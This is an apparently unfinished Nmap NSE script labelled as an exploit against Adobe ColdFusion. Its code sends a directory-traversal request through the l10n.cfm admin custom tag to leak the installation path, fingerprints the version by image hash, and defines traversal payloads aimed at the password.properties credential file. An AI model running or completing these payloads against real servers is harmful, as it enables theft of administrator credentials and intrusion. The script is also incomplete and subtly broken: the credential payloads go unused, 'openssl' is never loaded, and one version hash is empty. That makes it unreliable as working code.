description = [[
Coldfusion-subzero exploit.
]]

---
-- @usage
-- 
-- @output
--
-- @args
--
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit"}

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"

portrule = shortport.http

local PATH_PAYLOAD = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
local IMG_PAYLOAD = "/CFIDE/administrator/images/loginbackground.jpg"
local CREDENTIALS_PAYLOAD = {"../../lib/password.properties", '..\\..\\lib\\password.properties', '..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\lib\\password.properties'}

---
-- Extracts absolute path of installation by reading the ANALIZER_DIRECTORY value from the header 'set-cookie'
--
local function get_installation_path(host, port, basepath)
  local req = http.get(host, port, basepath..PATH_PAYLOAD)
  if req.header['set-cookie'] then
    stdnse.print_debug(1, "%s:Header 'set-cookie' detected in response.", SCRIPT_NAME)
    local _, _, path = string.find(req.header['set-cookie'], "path=/, ANALYZER_DIRECTORY=(.-);path=/")
    stdnse.print_debug(1, "%s: Extracted path:%s", SCRIPT_NAME, path)
    return path
  end
  return nil
end

---
-- Extracts version by comparing an image with known md5 checksums
--
local function get_version(host, port, basepath)
  local version = -1
  local img_req = http.get(host, port, basepath..IMG_PAYLOAD)
  if img_req.status == 200 then
    local md5chk = stdnse.tohex(openssl.md5(img_req.body))
    if md5chk == "a4c81b7a6289b2fc9b36848fa0cae83c" then
      stdnse.print_debug(1, "%s:CF version 10 detected.", SCRIPT_NAME)
      version = 10
    elseif md5chk == "596b3fc4f1a0b818979db1cf94a82220" then
      stdnse.print_debug(1, "%s:CF version 9 detected.", SCRIPT_NAME)
      version = 9
    elseif md5chk == "" then
      stdnse.print_debug(1, "%s:CF version 8 detected.", SCRIPT_NAME)
      version = 8
    else 
      stdnse.print_debug(1, "%s:Could not determine version.", SCRIPT_NAME)
    end
  end
  return version
end

action = function(host, port)
  local basepath = stdnse.get_script_args(SCRIPT_NAME..".basepath") or "/"
  local installation_path = get_installation_path(host, port, basepath)
  if not(installation_path) then
    return nil
  end

  local version_num = get_version(host, port, basepath)

end
